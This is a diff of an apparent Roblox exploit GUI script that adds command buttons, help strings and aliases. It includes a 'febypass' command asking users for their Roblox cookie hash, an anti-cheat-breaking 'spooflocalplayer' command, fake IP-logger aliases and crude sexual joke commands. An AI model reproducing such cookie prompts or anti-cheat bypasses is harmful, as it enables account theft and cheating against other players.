--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UICorner
-G2L["84"] = Instance.new("UICorner", G2L["10"]);
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >febypass/<roblox cookie hash (for roblox api)>
+G2L["84"] = Instance.new("TextButton", G2L["11"]);
+G2L["84"]["TextWrapped"] = true;
+G2L["84"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["84"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["84"]["TextSize"] = 14;
+G2L["84"]["TextScaled"] = true;
+G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["84"]["ZIndex"] = 2147483647;
+G2L["84"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["84"]["BackgroundTransparency"] = 1;
+G2L["84"]["Name"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];
+G2L["84"]["Text"] = [[ >febypass/<roblox cookie hash (for roblox api)>]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >febypass/<roblox cookie hash (for roblox api)>.Info
+G2L["85"] = Instance.new("StringValue", G2L["84"]);
+G2L["85"]["Name"] = [[Info]];
+G2L["85"]["Value"] = [[Command Info: This like looks way to legit to not be real... The reason it needs the roblox cookie hash because of me using roblox api to get the server ip since i couldnt find any other ways of getting the server ip to make it work]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vrsetup
+G2L["86"] = Instance.new("TextButton", G2L["11"]);
+G2L["86"]["TextWrapped"] = true;
+G2L["86"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["86"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["86"]["TextSize"] = 14;
+G2L["86"]["TextScaled"] = true;
+G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["86"]["ZIndex"] = 2147483647;
+G2L["86"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["86"]["BackgroundTransparency"] = 1;
+G2L["86"]["Name"] = [[ >vrsetup]];
+G2L["86"]["Text"] = [[ >vrsetup]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vrsetup.Info
+G2L["87"] = Instance.new("StringValue", G2L["86"]);
+G2L["87"]["Name"] = [[Info]];
+G2L["87"]["Value"] = [[Command Info: DO NOT USE VR UNTIL YOU ARE DONE SETTING THE THING UP]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >walkonwalls
+G2L["88"] = Instance.new("TextButton", G2L["11"]);
+G2L["88"]["TextWrapped"] = true;
+G2L["88"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["88"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["88"]["TextSize"] = 14;
+G2L["88"]["TextScaled"] = true;
+G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["88"]["ZIndex"] = 2147483647;
+G2L["88"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["88"]["BackgroundTransparency"] = 1;
+G2L["88"]["Name"] = [[ >walkonwalls]];
+G2L["88"]["Text"] = [[ >walkonwalls]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >walkonwalls.Info
+G2L["89"] = Instance.new("StringValue", G2L["88"]);
+G2L["89"]["Name"] = [[Info]];
+G2L["89"]["Value"] = [[Command Info: Become spiderman literally]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipscmds
+G2L["8a"] = Instance.new("TextButton", G2L["11"]);
+G2L["8a"]["TextWrapped"] = true;
+G2L["8a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["8a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["8a"]["TextSize"] = 14;
+G2L["8a"]["TextScaled"] = true;
+G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8a"]["ZIndex"] = 2147483647;
+G2L["8a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["8a"]["BackgroundTransparency"] = 1;
+G2L["8a"]["Name"] = [[ >rochipscmds]];
+G2L["8a"]["Text"] = [[ >rochipscmds]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipscmds.Info
+G2L["8b"] = Instance.new("StringValue", G2L["8a"]);
+G2L["8b"]["Name"] = [[Info]];
+G2L["8b"]["Value"] = [[Command Info: Some goofy admin system I found randomly.]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsadmin
+G2L["8c"] = Instance.new("TextButton", G2L["11"]);
+G2L["8c"]["TextWrapped"] = true;
+G2L["8c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["8c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["8c"]["TextSize"] = 14;
+G2L["8c"]["TextScaled"] = true;
+G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8c"]["ZIndex"] = 2147483647;
+G2L["8c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["8c"]["BackgroundTransparency"] = 1;
+G2L["8c"]["Name"] = [[ >rochipsadmin]];
+G2L["8c"]["Text"] = [[ >rochipsadmin]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsadmin.Info
+G2L["8d"] = Instance.new("StringValue", G2L["8c"]);
+G2L["8d"]["Name"] = [[Info]];
+G2L["8d"]["Value"] = [[Command Info: Ermmm Admin panel I randomly found.]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsuni
+G2L["8e"] = Instance.new("TextButton", G2L["11"]);
+G2L["8e"]["TextWrapped"] = true;
+G2L["8e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["8e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["8e"]["TextSize"] = 14;
+G2L["8e"]["TextScaled"] = true;
+G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8e"]["ZIndex"] = 2147483647;
+G2L["8e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["8e"]["BackgroundTransparency"] = 1;
+G2L["8e"]["Name"] = [[ >rochipsuni]];
+G2L["8e"]["Text"] = [[ >rochipsuni]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rochipsuni.Info
+G2L["8f"] = Instance.new("StringValue", G2L["8e"]);
+G2L["8f"]["Name"] = [[Info]];
+G2L["8f"]["Value"] = [[Command Info: Has so many features bro and its universal]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >jork
+G2L["90"] = Instance.new("TextButton", G2L["11"]);
+G2L["90"]["TextWrapped"] = true;
+G2L["90"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["90"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["90"]["TextSize"] = 14;
+G2L["90"]["TextScaled"] = true;
+G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["90"]["ZIndex"] = 2147483647;
+G2L["90"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["90"]["BackgroundTransparency"] = 1;
+G2L["90"]["Name"] = [[ >jork]];
+G2L["90"]["Text"] = [[ >jork]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >jork.Info
+G2L["91"] = Instance.new("StringValue", G2L["90"]);
+G2L["91"]["Name"] = [[Info]];
+G2L["91"]["Value"] = [[Command Info: Why did I even add this bro... ITS JERKING OFF DAMN IT]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antibackshots
+G2L["92"] = Instance.new("TextButton", G2L["11"]);
+G2L["92"]["TextWrapped"] = true;
+G2L["92"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["92"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["92"]["TextSize"] = 14;
+G2L["92"]["TextScaled"] = true;
+G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["92"]["ZIndex"] = 2147483647;
+G2L["92"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["92"]["BackgroundTransparency"] = 1;
+G2L["92"]["Name"] = [[ >antibackshots]];
+G2L["92"]["Text"] = [[ >antibackshots]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antibackshots.Info
+G2L["93"] = Instance.new("StringValue", G2L["92"]);
+G2L["93"]["Name"] = [[Info]];
+G2L["93"]["Value"] = [[Command Info: makes you turn around when someone does it to you and also makes you inch back and nod]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >autobackshots
+G2L["94"] = Instance.new("TextButton", G2L["11"]);
+G2L["94"]["TextWrapped"] = true;
+G2L["94"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["94"]["TextSize"] = 14;
+G2L["94"]["TextScaled"] = true;
+G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["94"]["ZIndex"] = 2147483647;
+G2L["94"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["94"]["BackgroundTransparency"] = 1;
+G2L["94"]["Name"] = [[ >autobackshots]];
+G2L["94"]["Text"] = [[ >autobackshots]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >autobackshots.Info
+G2L["95"] = Instance.new("StringValue", G2L["94"]);
+G2L["95"]["Name"] = [[Info]];
+G2L["95"]["Value"] = [[Command Info: same as anti version but it also includes you backshotting too (why am i even saying this stuff anymore)]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >reset
+G2L["96"] = Instance.new("TextButton", G2L["11"]);
+G2L["96"]["TextWrapped"] = true;
+G2L["96"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["96"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["96"]["TextSize"] = 14;
+G2L["96"]["TextScaled"] = true;
+G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["96"]["ZIndex"] = 2147483647;
+G2L["96"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["96"]["BackgroundTransparency"] = 1;
+G2L["96"]["Name"] = [[ >reset]];
+G2L["96"]["Text"] = [[ >reset]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >reset.Info
+G2L["97"] = Instance.new("StringValue", G2L["96"]);
+G2L["97"]["Name"] = [[Info]];
+G2L["97"]["Value"] = [[Command Info: Breaks your joints basically]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >respawn
+G2L["98"] = Instance.new("TextButton", G2L["11"]);
+G2L["98"]["TextWrapped"] = true;
+G2L["98"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["98"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["98"]["TextSize"] = 14;
+G2L["98"]["TextScaled"] = true;
+G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["98"]["ZIndex"] = 2147483647;
+G2L["98"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["98"]["BackgroundTransparency"] = 1;
+G2L["98"]["Name"] = [[ >respawn]];
+G2L["98"]["Text"] = [[ >respawn]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >respawn.Info
+G2L["99"] = Instance.new("StringValue", G2L["98"]);
+G2L["99"]["Name"] = [[Info]];
+G2L["99"]["Value"] = [[Command Info: I hope this works but what it basically does is it temporarily lowers the respawntime and kills you and stuff]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >resetp
+G2L["9a"] = Instance.new("TextButton", G2L["11"]);
+G2L["9a"]["TextWrapped"] = true;
+G2L["9a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["9a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["9a"]["TextSize"] = 14;
+G2L["9a"]["TextScaled"] = true;
+G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9a"]["ZIndex"] = 2147483647;
+G2L["9a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["9a"]["BackgroundTransparency"] = 1;
+G2L["9a"]["Name"] = [[ >resetp]];
+G2L["9a"]["Text"] = [[ >resetp]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >resetp.Info
+G2L["9b"] = Instance.new("StringValue", G2L["9a"]);
+G2L["9b"]["Name"] = [[Info]];
+G2L["9b"]["Value"] = [[Command Info: Uhhh it just is reset but teleports you back to og position]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >refresh
+G2L["9c"] = Instance.new("TextButton", G2L["11"]);
+G2L["9c"]["TextWrapped"] = true;
+G2L["9c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["9c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["9c"]["TextSize"] = 14;
+G2L["9c"]["TextScaled"] = true;
+G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9c"]["ZIndex"] = 2147483647;
+G2L["9c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["9c"]["BackgroundTransparency"] = 1;
+G2L["9c"]["Name"] = [[ >refresh]];
+G2L["9c"]["Text"] = [[ >refresh]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >refresh.Info
+G2L["9d"] = Instance.new("StringValue", G2L["9c"]);
+G2L["9d"]["Name"] = [[Info]];
+G2L["9d"]["Value"] = [[Command Info: same has respawn but puts you back to og pos]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scp173
+G2L["9e"] = Instance.new("TextButton", G2L["11"]);
+G2L["9e"]["TextWrapped"] = true;
+G2L["9e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["9e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["9e"]["TextSize"] = 14;
+G2L["9e"]["TextScaled"] = true;
+G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9e"]["ZIndex"] = 2147483647;
+G2L["9e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["9e"]["BackgroundTransparency"] = 1;
+G2L["9e"]["Name"] = [[ >scp173]];
+G2L["9e"]["Text"] = [[ >scp173]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scp173.Info
+G2L["9f"] = Instance.new("StringValue", G2L["9e"]);
+G2L["9f"]["Name"] = [[Info]];
+G2L["9f"]["Value"] = [[Command Info: become scp 173 idk]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spooflocalplayer
+G2L["a0"] = Instance.new("TextButton", G2L["11"]);
+G2L["a0"]["TextWrapped"] = true;
+G2L["a0"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["a0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["a0"]["TextSize"] = 14;
+G2L["a0"]["TextScaled"] = true;
+G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a0"]["ZIndex"] = 2147483647;
+G2L["a0"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["a0"]["BackgroundTransparency"] = 1;
+G2L["a0"]["Name"] = [[ >spooflocalplayer]];
+G2L["a0"]["Text"] = [[ >spooflocalplayer]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spooflocalplayer.Info
+G2L["a1"] = Instance.new("StringValue", G2L["a0"]);
+G2L["a1"]["Name"] = [[Info]];
+G2L["a1"]["Value"] = [[Command Info: breaks client anti cheats and maybe scriopts too idk]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fakewallhop
+G2L["a2"] = Instance.new("TextButton", G2L["11"]);
+G2L["a2"]["TextWrapped"] = true;
+G2L["a2"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["a2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["a2"]["TextSize"] = 14;
+G2L["a2"]["TextScaled"] = true;
+G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a2"]["ZIndex"] = 2147483647;
+G2L["a2"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["a2"]["BackgroundTransparency"] = 1;
+G2L["a2"]["Name"] = [[ >fakewallhop]];
+G2L["a2"]["Text"] = [[ >fakewallhop]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fakewallhop.Info
+G2L["a3"] = Instance.new("StringValue", G2L["a2"]);
+G2L["a3"]["Name"] = [[Info]];
+G2L["a3"]["Value"] = [[Command Info: tricks peoples into thinking your doing it yourself also press H to activate and make sure to be in front of a wall facing it]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >ball
+G2L["a4"] = Instance.new("TextButton", G2L["11"]);
+G2L["a4"]["TextWrapped"] = true;
+G2L["a4"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["a4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["a4"]["TextSize"] = 14;
+G2L["a4"]["TextScaled"] = true;
+G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a4"]["ZIndex"] = 2147483647;
+G2L["a4"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["a4"]["BackgroundTransparency"] = 1;
+G2L["a4"]["Name"] = [[ >ball]];
+G2L["a4"]["Text"] = [[ >ball]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >ball.Info
+G2L["a5"] = Instance.new("StringValue", G2L["a4"]);
+G2L["a5"]["Name"] = [[Info]];
+G2L["a5"]["Value"] = [[Command Info: Become a rolling ball thing idk]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >infostuff
+G2L["a6"] = Instance.new("TextButton", G2L["11"]);
+G2L["a6"]["TextWrapped"] = true;
+G2L["a6"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["a6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["a6"]["TextSize"] = 14;
+G2L["a6"]["TextScaled"] = true;
+G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a6"]["ZIndex"] = 2147483647;
+G2L["a6"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["a6"]["BackgroundTransparency"] = 1;
+G2L["a6"]["Name"] = [[ >infostuff]];
+G2L["a6"]["Text"] = [[ >infostuff]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >infostuff.Info
+G2L["a7"] = Instance.new("StringValue", G2L["a6"]);
+G2L["a7"]["Name"] = [[Info]];
+G2L["a7"]["Value"] = [[Command Info: idk its a remake of something myworld made]];
+
+
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UICorner
+G2L["a8"] = Instance.new("UICorner", G2L["10"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UIStroke
-G2L["85"] = Instance.new("UIStroke", G2L["10"]);
-G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["85"]["Color"] = Color3.fromRGB(0, 171, 255);
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UIStroke
+G2L["a9"] = Instance.new("UIStroke", G2L["10"]);
+G2L["a9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["a9"]["Color"] = Color3.fromRGB(0, 171, 255);
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UIDragDetector
-G2L["86"] = Instance.new("UIDragDetector", G2L["d"]);
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UIDragDetector
+G2L["aa"] = Instance.new("UIDragDetector", G2L["d"]);
 
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
 local function C_c()
 local script = G2L["c"];
 	-- not a complete rewrite but the commands system was rewritten
@@ -1499,7 +1904,7 @@ local script = G2L["c"];
 			input:CaptureFocus()
 			task.spawn(function()
 				game:GetService("RunService").RenderStepped:Wait()
-				input.Text = pf
+				input.Text = prefix
 			end)
 		end
 	end)
@@ -1562,14 +1967,33 @@ local script = G2L["c"];
 		unglitchradio = {"ungradio","ungboombox","unglitchradio","unglitchboombox"},
 		animlogs = {"animlogs","animlogger","animationlogs","animationlogger"},
 		iplog = {"ip","iplog","iplogger","fakeip","fakeiplog","fakeiplogger"},
+		vrsetup = {"vr","vrsu","vrsetup","virtualrealitysetup"},
+		walkonwalls = {"grav","gravity","spiderman","walkonwalls"},
+		rochipscmds = {"rccmds","rochipscmds","rochipscommands"},
+		rochipsadminpanel = {"rcap","rcadmin","rcadminpanel","rochipsadmin","rochipsadminpanel"},
+		rochipsuni = {"rcup","rcuni","rcunipanel","rcuniversal","rochipsuni","rochipsuniversal"},
+		jorking = {"jerk","jork","jack","stroke"},
+		antibackshots = {"antibs","antibackshots"},
+		autobackshots = {"autobs","autobackshots"},
+		febypass = {"febypass","test"}, -- kind of was convincing so added it
+		reset = {"oof","ded","die","dead","reset"},
+		fastreset = {"re","res","spawn","respawn","fastreset"},
+		posreset = {"oofp","dedp","diep","deadp","resetp"},
+		posfastreset = {"ref","refresh","fastresetp"},
+		scp173 = {"173","scp173","peanut","thesculpture"},
+		spooflocalplayer = {"slp","spooflp","spooflocalplayer"},
